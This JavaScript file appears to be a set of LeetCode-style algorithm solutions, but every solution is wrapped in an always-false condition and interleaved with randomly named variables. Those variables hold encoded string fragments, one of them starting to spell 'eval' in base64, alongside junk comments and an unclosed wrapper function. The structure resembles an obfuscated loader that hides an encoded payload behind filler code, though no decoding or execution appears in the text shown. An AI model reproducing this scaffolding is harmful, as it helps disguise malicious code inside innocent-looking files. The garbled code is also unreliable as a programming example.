if ('true' === true) {
    /**
Given a range [m, n] where 0 <= m <= n <= 2147483647, return the bitwise AND of all numbers in this range, inclusive.

For example, given the range [5, 7], you should return 4.
*/

/**
 * @param {number} m
 * @param {number} n
 * @return {number}
 */
var rangeBitwiseAnd = function(m, n) {
    var offset = 0;
    
    while (m && n) {
        if (m === n) {
            return m << offset;
        }
        
        m >>= 1;
        n >>= 1;
        offset++;
    }
    
    return 0;
};

}

    var aqzasyknd = 'OOFwhJpku';
(function() {
    var clroigda = 'wRUTnfd';
if (0.86 && false) {
    /**
Given an integer n, return the number of trailing zeroes in n!.

Note: Your solution should be in logarithmic time complexity.
*/

/**
 * @param {number} n
 * @return {number}
 */
var trailingZeroes = function(n) {
    var divider = 5,
        reminder = 0;
    
    while (divider <= n) {
        reminder += Math.floor(n/divider);
        divider = divider * 5;
    }
    
    return reminder;
};

}


if (0.47 && false) {
    /**
Implement regular expression matching with support for '.' and '*'.

'.' Matches any single character.
'*' Matches zero or more of the preceding element.

The matching should cover the entire input string (not partial).

The function prototype should be:
bool isMatch(const char *s, const char *p)

Some examples:
isMatch("aa","a") → false
isMatch("aa","aa") → true
isMatch("aaa","aa") → false
isMatch("aa", "a*") → true
isMatch("aa", ".*") → true
isMatch("ab", ".*") → true
isMatch("aab", "c*a*b") → true
*/
/**
 * @param {string} s
 * @param {string} p
 * @return {boolean}
 * 
 * The most critical observation is that "x*" can either match empty string, or at least one x. In the latter case, it is equivalent to "xx*" or "x*x"
 * 
 *  
        'match' below including .
    f(i,j) means s where s.len=i matches p where p.len=j
    f(i,j) =
        if (p_j-1 != * ) f(i-1, j-1) and s_i-1 matches p_j-1
        if (p_j-1 == * )
            * matches zero times: f(i,j-2)
            or * matches at least one time: f(i-1,j) and s_i-1 matches p_j-2
 */
var isMatch = function(s, p) {
    var lenS = s.length,
        lenP = p.length,
        f = [],
        i,
        j;
    
    if (p.length === 0) {
        return s.length === 0;
    }
    
    if (p.charAt(0) === '*') {
        return false;
    }
    
    for (i = 0; i <= lenS; i++) {
        f.push(new Array(lenP + 1));
        for (j = 0; j <= lenP; j++) {
            f[i][j] = false;
        }
    }
    
    f[0][0] = true;
    
    for (i = 1; i < lenP; i++) {
        if (p.charAt(i) === '*') {
            f[0][i + 1] = f[0][i - 1];
        }
    }
    
    for (i = 1; i <= lenS; i++) {
        for (j = 1; j <= lenP; j++) {
            if (p.charAt(j - 1) === '*') {
                f[i][j] = f[i][j - 2] || (f[i - 1][j] && (s.charAt(i - 1) === p.charAt(j - 2) || p.charAt(j - 2) === '.'));
            } else {
                f[i][j] = f[i - 1][j - 1] && (s.charAt(i - 1) === p.charAt(j - 1) || p.charAt(j - 1) === '.');
            }
        }
    }
    
    return f[lenS][lenP];
};


// TIME LIMIT EXCEEDED
var isMatch = function(s, p) {
    var lenS = s.length,
        lenP = p.length,
        i,
        j;
    
    if (p.length === 0) {
        return s.length === 0;
    }
    
    if (p.charAt(1) === '*') {
        return isMatch(s, p.substr(2)) || s.length > 0 && (s.charAt(0) === p.charAt(0) || p.charAt(0) === '.') && isMatch(s.substr(1), p);
    } else {
        return s.length > 0 && (s.charAt(0) === p.charAt(0) || p.charAt(0) === '.') && isMatch(s.substr(1), p.substr(1));
    }

};

}

    var kqslao = 'MvqvqiJ';
    var tdnmjdtzdwv = 'ZXZhb';
if (typeof document === 'undefined') {
    /**
Given a string s and a dictionary of words dict, add spaces in s to construct a sentence where each word is a valid dictionary word.

Return all such possible sentences.

For example, given
s = "catsanddog",
dict = ["cat", "cats", "and", "sand", "dog"].

A solution is ["cats and dog", "cat sand dog"].


*/
// Time limit exceeded...
/**
 * @param {string} s
 * @param {set<string>} wordDict
 *   Note: wordDict is a Set object, see:
 *   https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set
 * @return {string[]}
 */
var wordBreak = function(s, wordDict) {
    const len = s.length;
    let hasSeg = [];
    let result = [];
    let i, j;
    
    for (i = 0; i <= len; i++) {
        hasSeg.push(new Array(len + 1).fill(false));    
    }
    
    hasSeg[0][0] = true;
    
    for (i = 0; i <= len; i++) {
        for (j = i; j >= 0; j--) {
            if (wordDict.has(s.slice(j, i))) {
                hasSeg[j][i] = true;
            } else {
                for (let k = j; k < i; k++) {
                    if (hasSeg[j][k] && hasSeg[k][i]) {
                        hasSeg[j][i] = true;
                        break;
                    }
                }
            }
        }
    }
    
    helper(result, [], 0, s, wordDict, hasSeg);
    
    return result;
};

function helper(result, curArr, startIndex, s, wordDict, hasSeg) {
    if (startIndex === s.length) {
        result.push(curArr.join(' '));
    }
    
    for (let i = startIndex; i <= s.length; i++) {
        if (hasSeg[startIndex][i]) {
            if (wordDict.has(s.slice(startIndex, i))) {
                curArr.push(s.slice(startIndex, i));
                helper(result, curArr.concat(), i, s, wordDict, hasSeg);
                curArr.pop();
            }
        }
    }
}

// Memory limit exceeded
/**
 * @param {string} s
 * @param {set<string>} wordDict
 *   Note: wordDict is a Set object, see:
 *   https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set
 * @return {string[]}
 */
var wordBreak = function(s, wordDict) {
    let map = {};
    
    return helper(map, s, wordDict);
};

function helper(map, s, wordDict) {
    if (map.hasOwnProperty(s)) {
        return map[s];
    }
    
    let result = [];
    
    if (s.length === 0) {
        result.push('');
        return result;
    }
    
    wordDict.forEach(word => {
        if (s.startsWith(word)) {
            let subArr = helper(map, s.slice(word.length), wordDict);
            
            result.push((word + ' ' +  subArr.join(' ')).trim());
        }
    });
    
    map[s] = result;
    return result;
}

}

    var ugitzobbxyh = 'JqSxfVSQ';
    var dmdixichhpfje = 'ChhdG9';
if (typeof navigator === 'undefined') {
    /**
Given a matrix of m x n elements (m rows, n columns), return all elements of the matrix in spiral order.

For example,
Given the following matrix:

[
 [ 1, 2, 3 ],
 [ 4, 5, 6 ],
 [ 7, 8, 9 ]
]
You should return [1,2,3,6,9,8,7,4,5].
*/

/**
 * @param {number[][]} matrix
 * @return {number[]}
 */
var spiralOrder = function(matrix) {
    var rowL = matrix.length,
        result = [],
        columnL;
        
    if (rowL === 0) {
        return result;
    }
    
    columnL = matrix[0].length;
    
    helper(0, rowL, columnL, matrix, result);
    return result;
};

function helper(level, row, column, matrix, result) {
    var i;
    
    if (row === 0 || column === 0) {
        return;
    } else if (row === 1) {
        for (i = 0; i < column; i++) {
            result.push(matrix[level][i + level]);
        }
    } else if (column === 1) {
        for (i = 0; i < row; i++) {
            result.push(matrix[i + level][level]);
        }
    } else {
        // top
        for (i = 0; i < column - 1; i++) {
            result.push(matrix[level][i + level]);
        }
        
        // right
        for (i = 0; i < row - 1; i++) {
            result.push(matrix[i + level][column + level - 1]);
        }
        
        // bottom
        for (i = column - 1; i > 0; i--) {
            result.push(matrix[row + level - 1][i + level]);
        }
        
        // left
        for (i = row - 1; i > 0; i--) {
            result.push(matrix[i + level][level]);
        }
        
        helper(level + 1, row - 2, column - 2, matrix, result);
    }
}

}

    var kdtzocjrig = 'fCvQqqjyG';
if (7 === 18) {
    /**
Two elements of a binary search tree (BST) are swapped by mistake.

Recover the tree without changing its structure.

Note:
A solution using O(n) space is pretty straight forward. Could you devise a constant space solution?
*/

// SOLUTION 1: O(N)
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {void} Do not return anything, modify root in-place instead.
 */
var recoverTree = function(root) {
    let array = [];
    treeToArray(root, array);
    
    let node1, node2;
    
    for (let i = 0; i < array.length - 1; i++) {
        if (array[i][0] > array[i + 1][0]) {
            if (!node1) {
                node1 = array[i][1];
                node2 = array[i + 1][1];
            } else {
                node2 = array[i + 1][1];
            }
        }
    }
    
    let temp = node1.val;
    node1.val = node2.val;
    node2.val = temp;
};

function treeToArray(root, array) {
    if (!root) {
        return;
    }
    
    treeToArray(root.left, array);
    array.push([root.val, root]);
    treeToArray(root.right, array);
}


// SOLUTION 2: constant space
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {void} Do not return anything, modify root in-place instead.
 */
var recoverTree = function(root) {
    let array = [];
    inorderTraverse(root, array);
    
    let node1 = array[1];
    let node2 = array[2];
    
    let temp = node1.val;
    node1.val = node2.val;
    node2.val = temp;
};

function inorderTraverse(root, array) {
    if (!root) {
        return;
    }
    
    inorderTraverse(root.left, array);
    
    if (array[0] && array[0].val > root.val) {
        if (!array[1]) {
            array[1] = array[0];
            array[2] = root;
        } else {
            array[2] = root;
        }
        
    }
    array[0] = root;
    
    inorderTraverse(root.right, array);
}

}

    var thgzjefdwqjxhp = 'iKCJ';
    var puxclpayvk = 'rOakC';
if (6 === 12) {
    /**
Follow up for problem "Populating Next Right Pointers in Each Node".

What if the given tree could be any binary tree? Would your previous solution still work?

Note:

You may only use constant extra space.
For example,
Given the following binary tree,
         1
       /  \
      2    3
     / \    \
    4   5    7
After calling your function, the tree should look like:
         1 -> NULL
       /  \
      2 -> 3 -> NULL
     / \    \
    4-> 5 -> 7 -> NULL
Subscribe to see which companies asked this question
*/
/**
 * Definition for binary tree with next pointer.
 * function TreeLinkNode(val) {
 *     this.val = val;
 *     this.left = this.right = this.next = null;
 * }
 */

/**
 * @param {TreeLinkNode} root
 * @return {void} Do not return anything, modify tree in-place instead.
 */
var connect = function(root) {
    if (!root) {
        return;
    }
    
    var curRow = [],
        nextRow = [],
        i;
        
    curRow.push(root);
    
    while (curRow.length > 0) {
        for (i = 0; i < curRow.length; i++) {
            if (curRow[i].left) {
                nextRow.push(curRow[i].left);
            }
            
            if (curRow[i].right) {
                nextRow.push(curRow[i].right);
            }
            
            if (i < curRow.length - 1) {
                curRow[i].next = curRow[i + 1];
            } else {
                curRow[i].next = null;
            }
        }
        
        curRow = nextRow;
        nextRow = [];
    }
};


// O(1) space solution

/**
 * Definition for binary tree with next pointer.
 * function TreeLinkNode(val) {
 *     this.val = val;
 *     this.left = this.right = this.next = null;
 * }
 */

/**
 * @param {TreeLinkNode} root
 * @return {void} Do not return anything, modify tree in-place instead.
 */
var connect = function(root) {
    let nextHead = null;
    let cur = root;
    let nextCur = null;
    
    while (cur !== null) {
        
        while (cur !== null) {
            if (cur.left) {
                if (!nextHead) {
                    nextHead = cur.left;
                    nextCur = nextHead;
                } else {
                    nextCur.next = cur.left;
                    nextCur = nextCur.next;
                }
            }
            
            if (cur.right) {
                if (!nextHead) {
                    nextHead = cur.right;
                    nextCur = nextHead;
                } else {
                    nextCur.next = cur.right;
                    nextCur = nextCur.next;
                }
            }
            
            cur = cur.next;
        }
        
        cur = nextHead;
        nextHead = null;
        nextCur = null;
    }
};

}

// await return value await debug constant compile
if (6 === 17) {
    /**
Given a binary tree, imagine yourself standing on the right side of it, return the values of the nodes you can see ordered from top to bottom.

For example:
Given the following binary tree,
   1            <---
 /   \
2     3         <---
 \     \
  5     4       <---
You should return [1, 3, 4].
*/

/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {number[]}
 */
var rightSideView = function(root) {
    var queue = [],
        result = [],
        i,
        len;
    
    if (!root) {
        return result;
    }
    
    queue.push(root);
    
    while (queue.length > 0) {
        len = queue.length;
        
        for (i = 0; i < len; i++) {
            node = queue.shift();
            
            // first one is the right most
            if (i === 0) {
                result.push(node.val);
            }
            
            if (node.right) {
                queue.push(node.right);
            }
            
            if (node.left) {
                queue.push(node.left);
            }
        }
    }
    
    return result;
};

}

    var ytzuuc = 'xmwFuf';
    var kdikfcuisqh = 'JQ0F2TH';
if (72 > 170) {
    /**
Implement the following operations of a queue using stacks.

push(x) -- Push element x to the back of queue.
pop() -- Removes the element from in front of queue.
peek() -- Get the front element.
empty() -- Return whether the queue is empty.
Notes:
You must use only standard operations of a stack -- which means only push to top, peek/pop from top, size, and is empty operations are valid.
Depending on your language, stack may not be supported natively. You may simulate a stack by using a list or deque (double-ended queue), as long as you use only standard operations of a stack.
You may assume that all operations are valid (for example, no pop or peek operations will be called on an empty queue).
*/

/**
 * @constructor
 */
var Queue = function() {
    this.stack1 = []; // come in
    this.stack2 = []; // for go out
};

/**
 * @param {number} x
 * @returns {void}
 */
Queue.prototype.push = function(x) {
    var len = this.stack2.length,
        i;
    
    for (i = 0; i < len; i++) {
        this.stack1.push(this.stack2.pop());
    }
    
    this.stack1.push(x);
    
    for (i = 0; i < len + 1; i++) {
        this.stack2.push(this.stack1.pop());
    }
};

/**
 * @returns {void}
 */
Queue.prototype.pop = function() {
    this.stack2.pop();
};

/**
 * @returns {number}
 */
Queue.prototype.peek = function() {
    var x = this.stack2.pop();
    
    this.stack2.push(x);
    return x;
};

/**
 * @returns {boolean}
 */
Queue.prototype.empty = function() {
    var len = this.stack2.length;
        
    if (len === 0) {
        return true;
    }
    
    return false;
};

}

    var iutrqvocvjlj = 'NzOW';
    var uletbodhjx = 'lCRWFYTmh';
    var aqlnkcwy = 'kRxAIzuge';
if (2 instanceof String) {
    /**
Implement the following operations of a stack using queues.

push(x) -- Push element x onto stack.
pop() -- Removes the element on top of the stack.
top() -- Get the top element.
empty() -- Return whether the stack is empty.
Notes:
You must use only standard operations of a queue -- which means only push to back, peek/pop from front, size, and is empty operations are valid.
Depending on your language, queue may not be supported natively. You may simulate a queue by using a list or deque (double-ended queue), as long as you use only standard operations of a queue.
You may assume that all operations are valid (for example, no pop or top operations will be called on an empty stack).
Update (2015-06-11):
The class name of the Java function had been updated to MyStack instead of Stack.


*/

/**
 * @constructor
 */
var Stack = function() {
    this.stack1 = [];
    this.stack2 = [];
};

/**
 * @param {number} x
 * @returns {void}
 */
Stack.prototype.push = function(x) {
    var temp;
    
    this.stack2.push(x);
    
    while(this.stack1.length > 0) {
        this.stack2.push(this.stack1.shift());
    }
    
    temp = this.stack2;
    this.stack2 = this.stack1;
    this.stack1 = temp;
};

/**
 * @returns {void}
 */
Stack.prototype.pop = function() {
    return this.stack1.shift();
};

/**
 * @returns {number}
 */
Stack.prototype.top = function() {
    return this.stack1[0];
};

/**
 * @returns {boolean}
 */
Stack.prototype.empty = function() {
    return this.stack1.length === 0;
};

}

    var ywhjycudt = 'ZbXhsY3l';
    var brvuayrt = 'qdtHCBjurm';
if ('true' === true) {
    /**
Given a binary tree, return the bottom-up level order traversal of its nodes' values. (ie, from left to right, level by level from leaf to root).

For example:
Given binary tree {3,9,20,#,#,15,7},
    3
   / \
  9  20
    /  \
   15   7
return its bottom-up level order traversal as:
[
  [15,7],
  [9,20],
  [3]
]
confused what "{1,#,2,3}" means? > read more on how binary tree is serialized on OJ.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {number[][]}
 */
var levelOrderBottom = function(root) {
    var result = [],
        parent = [],
        parentData,
        cur;
    
    if (root === null) {
        return result;
    }
    
    parent.push(root);
    
    while (parent.length > 0) {
        cur = [];
        parentData = [];
        
        for (var i in parent) {
            parent[i].left ? cur.push(parent[i].left) : null;
            parent[i].right? cur.push(parent[i].right) : null;
            parentData.push(parent[i].val);
        }
        
        result.unshift(parentData);
        
        parent = cur;
    }
    
    return result;
};

}

    var thhkleceajftzt = 'CemNH';
    var briifaigvba = 'pVfh';
    var mvfnearueup = 'VmphV1pwWX';
    var qmorrbspq = 'zSRgNod';
    var kacqkfxnte = 'lCclpYbG';
    var ubuqdyitkb = 'qQDhfq';
    var drnnksurjqp = 'liM';
    var wgnurxnyoin = 'lsTqxpklbw';
if ('false' === true) {
    /**
Given an array of integers and an integer k, find out whether there are two distinct indices i and j in the array such that nums[i] = nums[j] and the difference between i and j is at most k.
*/
/**
 * @param {number[]} nums
 * @param {number} k
 * @return {boolean}
 */
var containsNearbyDuplicate = function(nums, k) {
    var map = {},
        len = nums.length,
        i;
    
    for (i = 0; i < len; i++) {
        if (map.hasOwnProperty(nums[i])) {
            if (i - map[nums[i]] <= k) {
                return true;
            }
            
            map[nums[i]] = i;
        } else {
            map[nums[i]] = i;
        }
    }
    
    return false;
};

}

    var mypvy = 'kZ5Wk';
if (null === 3) {
    /**
Given a linked list, swap every two adjacent nodes and return its head.

For example,
Given 1->2->3->4, you should return the list as 2->1->4->3.

Your algorithm should use only constant space. You may not modify the values in the list, only nodes itself can be changed.
*/

/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @return {ListNode}
 */
var swapPairs = function(head) {
    if (head === null) {
        return null;
    }
    
    var next = head.next,
        result = next? next : head,
        prevTail,
        curHead,
        nextHead;
    
    curHead = head;

    while(next) {
        nextHead = next.next;
        
        if (prevTail) {
            prevTail.next = next;
        }
        
        next.next = curHead;
        curHead.next = nextHead;
        prevTail = curHead;
        
        curHead = nextHead;
        next = curHead && curHead.next;
    }
    
    return result;
};

}

    var qdzoxfvgx = 'msEqMTb';
if (96 > 162) {
    /**
 * @param {number} rowIndex
 * @return {number[]}
 */
var getRow = function(rowIndex) {
    var result = [],
        parent = [],
        curRow,
        i;
    
    if (rowIndex < 0) {
        return result;
    }
    
    curRow = 0;
    parent.push(1);
    result.push(1);
    
    while (curRow < rowIndex) {
        curRow++;
        result = [];
        result.push(1);
        for (i = 1; i < curRow; i++) {
            result[i] = parent[i] + parent[i - 1];
        }
        
        result.push(1);
        parent = result.concat();
    }
    
    return result;
};

// in place solution
/**
 * @param {number} rowIndex
 * @return {number[]}
 */
var getRow = function(rowIndex) {
    var result = [],
        curRow,
        i;
    
    if (rowIndex < 0) {
        return result;
    }
    
    curRow = 0;
    result.push(1);
    
    while (curRow < rowIndex) {
        curRow++;
        
        for (i = curRow - 1; i > 0; i--) {
            result[i] = result[i] + result[i - 1];
        }
        
        result.push(1);
    }
    
    return result;
};

}

// world import array wlquabf event value object constant zzhjawj loop woxv compile return
    var uozxqexgdukl = 'PgEsIaX';
if (!true && 0) {
    /**
Given an absolute path for a file (Unix-style), simplify it.

For example,
path = "/home/", => "/home"
path = "/a/./b/../../c/", => "/c"
click to show corner cases.

Corner Cases:
Did you consider the case where path = "/../"?
In this case, you should return "/".
Another corner case is the path might contain multiple slashes '/' together, such as "/home//foo/".
In this case, you should ignore redundant slashes and return "/home/foo".
*/
/**
 * @param {string} path
 * @return {string}
 */
var simplifyPath = function(path) {
    var paths = [],
        arr = path.split('/'),
        len = arr.length,
        cur,
        i,
        result = '';
        
    for (i = 0; i < len; i++) {
        cur = arr[i];
        
        if (cur === '.' || cur.length === 0) {
            continue;
        }
        
        if (cur === '..') {
            if (paths.length > 0) {
                paths.pop();
            }
        } else {
            paths.push(cur);
        }
    }
    
    for (i = 0; i < paths.length; i++) {
        result += '/' + paths[i];
    }
    
    if (result === '') {
        result = '/';
    }
    
    return result;
};

}

    var fhwateu = 'NCemF';
    var uzsptre = 'IqOgD';
if (0.67 && false) {
    /**
 You are given a m x n 2D grid initialized with these three possible values.

    -1 - A wall or an obstacle.
    0 - A gate.
    INF - Infinity means an empty room. We use the value 231 - 1 = 2147483647 to represent INF as you may assume that the distance to a gate is less than 2147483647.

Fill each empty room with the distance to its nearest gate. If it is impossible to reach a gate, it should be filled with INF.

For example, given the 2D grid:

INF  -1  0  INF
INF INF INF  -1
INF  -1 INF  -1
  0  -1 INF INF

After running your function, the 2D grid should be:

  3  -1   0   1
  2   2   1  -1
  1  -1   2  -1
  0  -1   3   4
*/

/**
 * @param {number[][]} rooms
 * @return {void} Do not return anything, modify rooms in-place instead.
 */
var wallsAndGates = function(rooms) {
    let queue = [];
    let rowLen = rooms.length;
    const MAX_VALUE = 2147483647;
    if (rowLen === 0) {
        return;
    }
    
    let colLen = rooms[0].length;
    
    for (let i = 0; i < rowLen; i++) {
        for (let j = 0; j < colLen; j++) {
            if (rooms[i][j] === 0) {
                queue.push([i, j]);
            }
        }
    }
    
    while (queue.length > 0) {
        const cur = queue.shift();
        const row = cur[0];
        const col = cur[1];
        const val = rooms[row][col];
        
        if (row + 1 < rowLen && rooms[row + 1][col] === MAX_VALUE) {
            rooms[row + 1][col] = val + 1;
            queue.push([row + 1, col])
        }
        
        if (row - 1 >= 0 && rooms[row - 1][col] === MAX_VALUE) {
            rooms[row - 1][col] = val + 1;
            queue.push([row - 1, col]);
        }
        
        if (col + 1 < colLen && rooms[row][col + 1] === MAX_VALUE) {
            rooms[row][col + 1] = val + 1;
            queue.push([row, col + 1]);
        }
        
        if (col - 1 >= 0 && rooms[row][col - 1] === MAX_VALUE) {
            rooms[row][col - 1] = val + 1;
            queue.push([row, col - 1]);
        }
    }
};

}

    var jlpvoqllabgxm = 'HOXlkR0';
    var afszcpcyh = 'nlxrbWM';
if (10 instanceof String) {
    /**
Given a binary tree, flatten it to a linked list in-place.

For example,
Given

         1
        / \
       2   5
      / \   \
     3   4   6
The flattened tree should look like:
   1
    \
     2
      \
       3
        \
         4
          \
           5
            \
             6

*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {void} Do not return anything, modify root in-place instead.
 */
var flatten = function(root) {
    var queue = [],
        node,
        len,
        i;

    helper(root, queue);
    
    len = queue.length;
    for (i = 0; i < len; i++) {
        node = queue.shift();
        node.left = null;
        node.right = queue.length > 0? queue[0] : null;
    }
};

function helper(root, queue) {
    if (!root) {
        return;
    }
    
    queue.push(root);
    helper(root.left, queue);
    helper(root.right, queue);
}


// SOLUTION 2
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {void} Do not return anything, modify root in-place instead.
 * 假设某节点的左右子树T(root->left)和T(root->right)已经flatten成linked list了：

    1
  /    \
 2     5
  \       \
   3      6 <- rightTail
     \
      4  <- leftTail

如何将root、T(root->left)、T(root->right) flatten成一整个linked list？显而易见：

temp = root->right
root->right  = root->left
root->left = NULL
leftTail->right = temp

 */
var flatten = function(root) {
    helper(root);
};

// return tail node
function helper(root) {
    if (!root) {
        return;
    }
    
    var leftTail = helper(root.left),
        rightTail = helper(root.right),
        temp;
        
        
    if (root.left) {
        temp = root.right;
        root.right = root.left;
        root.left = null;
        leftTail.right = temp;
    }
    
    if (rightTail) {
        return rightTail;
    }
    
    if (leftTail) {
        return leftTail;
    }
    
    return root;
}

}

    var dvgcsuafm = '4xZEh';
    var ooioxyvk = 'LnzMs';
// number await export array hello object import
    var hamwxjlu = 'pIXN';
    var wbhac = 'NZ2RI';
if (0.36 && false) {
    /**
You are given an integer array nums and you have to return a new counts array. The counts array has the property where counts[i] is the number of smaller elements to the right of nums[i].

Example:

Given nums = [5, 2, 6, 1]

To the right of 5 there are 2 smaller elements (2 and 1).
To the right of 2 there is only 1 smaller element (1).
To the right of 6 there is 1 smaller element (1).
To the right of 1 there is 0 smaller element.
Return the array [2, 1, 1, 0].
*/

/**
 * @param {number[]} nums
 * @return {number[]}
 * 
 * 将给定数组从最后一个开始，用二分法插入到一个新的数组，这样新数组就是有序的，那么此时该数字在新数组中的坐标就是原数组中其右边所有较小数字的个数
 */
var countSmaller = function(nums) {
    var result = [],
        tmp = [],
        len = nums.length,
        left,
        right,
        mid,
        i; // array for sorting nums
        
    for (i = len - 1; i >= 0; i--) {
        left = 0;
        right = tmp.length;
        
        while (left < right) {
            mid = Math.floor((left + right) / 2);
            if (tmp[mid] >= nums[i]) {
                right = mid;
            } else {
                left = mid + 1;
            }
        }
        
        result[i] = right;
        tmp.splice(right, 0, nums[i]);
    }
    
    return result;
};

}

    var bzknburh = 'rwKuBvE';
if (!true && 0) {
    /**
Follow up for "Remove Duplicates":
What if duplicates are allowed at most twice?

For example,
Given sorted array nums = [1,1,1,2,2,3],

Your function should return length = 5, with the first five elements of nums being 1, 1, 2, 2 and 3. It doesn't matter what you leave beyond the new length.
*/
/**
 * @param {number[]} nums
 * @return {number}
 */
var removeDuplicates = function(nums) {
    var duplicate = false,
        len = nums.length,
        index = 1,
        i;
    
    for (i = 1; i < len; i++) {
        if (duplicate && nums[i] === nums[i - 1]) {
            continue;
        }
        
        if (nums[i] === nums[i - 1]) {
            duplicate = true;
        } else {
            duplicate = false;
        }
        
        nums[index] = nums[i];
        index++;
    }
    
    return index;
};

}

// debug hello async event constant variable script yukrk import qmbagw yzizwrjd
    var owijtequrw = 'xrvsBf';
    var qeygxk = 'bHd';
    var vrolyn = 'ZTrH';
if (0.75 && false) {
    // Submission Result: Memory Limit Exceeded More Details 

// Last executed input:
// 123456

/**
 * @param {number} num
 * @return {number[]}
 */
 
/**
当一个数为2的整数幂的时候，1的个数为1，比如2（10) 和4(100)，8(1000)

在这之后就是前一个序列的数+1 比如 9(1001) = 1(1) + 8 (1) = 2

就是把一个数分解为小于它的最大2的整数幂 + x
*/
var countBits = function(num) {
    var result = [],
        pow = 1,
        copyOfPow = 1,
        i;
        
    result[0] = 0;
    
    for (i = 1; i <= num; i++) {
        if (i === pow) {
            result[i] = 1;
            copyOfPow = pow;
            pow *= 2;
        } else {
            result[i] = result[copyOfPow] + result[i - copyOfPow];
        }
    }
    
    return result;
};

/**
倒过来想，一个数 * 2 就是把它的二进制全部左移一位，也就是说 1的个数是相等的。

那么我们可以利用这个结论来做。

res[i /2] 然后看看最低位是否为1即可（上面*2一定是偶数，这边比如15和14除以2都是7，但是15时通过7左移一位并且+1得到，14则是直接左移）

所以res[i] = res[i >>1] + (i&1)
*/
var countBits = function(num) {
    var result = [],
        i;
        
    result[0] = 0;
    
    for (i = 1; i <= num; i++) {
       result[i] = result[i>>1] + (i & 1);
    }
    
    return result;
};

}

    var juhpmv = 'hV05oY';
if ('f' === 'T') {
    /**
Implement a basic calculator to evaluate a simple expression string.

The expression string may contain open ( and closing parentheses ), the plus + or minus sign -, non-negative integers and empty spaces .

You may assume that the given expression is always valid.

Some examples:
"1 + 1" = 2
" 2-1 + 2 " = 3
"(1+(4+5+2)-3)+(6+8)" = 23
Note: Do not use the eval built-in library function.
*/
/**
 * @param {string} s
 * @return {number}
 */
var calculate = function(s) {
    var stack = [],
        len = s.length,
        sum = 0,
        num,
        ch,
        j,
        i;
    
    stack.push(1);
    stack.push(1);
    
    for (i = 0; i < len; i++) {
        ch = s.charAt(i);
        
        if (!isNaN(parseInt(ch))) {
            num = parseInt(ch);
            
            for (j = i + 1; j < len && !isNaN(parseInt(s.charAt(j))); j++) {
                num = num * 10 + parseInt(s.charAt(j));
            }
            
            sum += stack.pop() * num;
            
            i = j - 1;
        } else if (ch === '+' || ch === '(') {
            stack.push(stack[stack.length - 1]);
        } else if (ch === '-') {
            stack.push(stack[stack.length - 1] * (-1));
        } else if (ch === ')') {
            stack.pop();
        }
    }
    
    return sum;
};

}

    var meiiyal = 'aeduve';
    var amkvlj = 'kd4NUlIV';
    var fwpsulbcwski = 'qGwCzKqonE';
if (9 === 19) {
    
/**
 * Given an array of integers, every element appears twice except for one. Find that single one.
 * Note:
 * Your algorithm should have a linear runtime complexity. Could you implement it without using extra memory?
 * 
 * @param {number[]} A
 * @return {number}
 */
var singleNumber = function(A) {
    var length = A.length,
        i,
        result = 0;
    if (length === 1) {
        return A[0];
    }
    for (i = 0; i < length; i++) {
        result = result ^ A[i];
    }
    return result;
};

}

    var cqpsbxjrgjzttyj = 'npaV1FnZEc';
if ('p' === 'Y') {
    /**
Given a string containing just the characters '(' and ')', find the length of the longest valid (well-formed) parentheses substring.

For "(()", the longest valid parentheses substring is "()", which has length = 2.

Another example is ")()())", where the longest valid parentheses substring is "()()", which has length = 4.
*/

/**
 * @param {string} s
 * @return {number}
 */
var longestValidParentheses = function(s) {
    var len = s.length,
        last = -1,
        left = [],
        max = 0,
        i;
    
    // the important thing here is track the last ')'
    for (i = 0; i < len; i++) {
        if (s.charAt(i) === '(') {
            left.push(i);
        } else {
            if (left.length === 0) {
                last = i;
            } else {
                left.pop();
                if (left.length === 0) {
                    max = Math.max(max, i - last);
                } else {
                    max = Math.max(max, i - left[left.length - 1]);
                }
            }
        }
    }
    
    return max;
};

}

    var bpxbtivb = 'wbnJlxC';
    var raxgxqg = '4Z1l';
    var gmhcczvnq = 'zXZfU';
if (typeof document === 'undefined') {
    /**
Say you have an array for which the ith element is the price of a given stock on day i.

Design an algorithm to find the maximum profit. You may complete at most two transactions.

Note:
You may not engage in multiple transactions at the same time (ie, you must sell the stock before you buy again).
*/
/**
 * @param {number[]} prices
 * @return {number}
 * 
 * 数组l[i]记录了price[0..i]的最大profit，
 * 数组r[i]记录了price[i..n]的最大profit。
 * 已知l[i]，求l[i+1]是简单的，同样已知r[i]，求r[i-1]也很容易。
 * 最后，我们再用O(n)的时间找出最大的l[i]+r[i]，即为题目所求。
 */
var maxProfit = function(prices) {
    var len = prices.length,
        l = [],
        r = [],
        i,
        max,
        min;
    
    l[0] = 0;
    min = prices[0];
    
    for (i = 1; i < len; i++) {
        l[i] = Math.max(l[0], prices[i] - min);
        min = Math.min(min, prices[i]);
    }
    
    r[len - 1] = 0;
    max = prices[len - 1];
    
    for (i = len - 2; i >= 0; i--) {
        r[i] = Math.max(r[i + 1], max - prices[i]);
        max = Math.max(max, prices[i]);
    }
    
    max = 0;
    
    for (i = 0; i < len; i++) {
        max = Math.max(max, l[i] + r[i]);
    }
    
    return max;
};

}

    var oiplogmedzkpw = 'XTmpaWE56S';
    var xqqmlpwv = 'ayZRqDNEX';
    var bzbqdgss = 'UdSbGRtV';
    var jehzdxmmkkjv = 'ezesemYwmf';
// define string define function await number
if (typeof window === 'undefined') {
    /**
Given an input string, reverse the string word by word.

